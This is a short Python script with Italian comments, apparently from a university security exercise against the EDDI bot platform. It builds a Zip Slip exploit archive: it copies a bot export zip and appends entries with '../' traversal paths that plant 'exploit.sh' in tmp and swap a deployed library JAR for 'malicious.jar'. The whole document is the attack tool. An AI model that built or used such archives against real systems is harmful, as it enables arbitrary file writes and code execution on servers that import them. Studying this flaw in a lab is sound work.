import zipfile
import shutil

#original = r"C:\Users\nikba\Downloads\s-68385dbe75c2331bc03c6bd5-1_original.zip"
original = r"C:\Users\nikba\Downloads\Party+bot-683a9c5edbf5e9600da18d00-1.zip"
patched  = r"C:\Users\nikba\Downloads\patched.zip"

# 1) Copia il .zip originale in patched.zip
shutil.copyfile(original, patched)

# 2) Apri patched.zip in modalit√† append e inietta exploit.sh + malicious.jar
with zipfile.ZipFile(patched, 'a') as zf:
    # Calcola il prefix corretto (adatta il numero di '..' se serve)
    prefix = '../' * 4  
    
    # Inietta lo script
    zf.writestr(
        f'{prefix}tmp/exploit.sh',
        open(r"C:\Users\nikba\Desktop\roba\uni\sse\EDDI_JDK17\VulnerabilityUse\exploit.sh", 'rb').read()
    )
    
    # Inietta il JAR maligno
    zf.writestr(
        f'{prefix}deployments/lib/main/org.eclipse.microprofile.openapi.microprofile-openapi-api-4.0.2.jar',
        open(r"C:\Users\nikba\Desktop\roba\uni\sse\EDDI_JDK17\work\malicious.jar", 'rb').read()
    )

print("Creato il nuovo ZIP con payload:", patched)
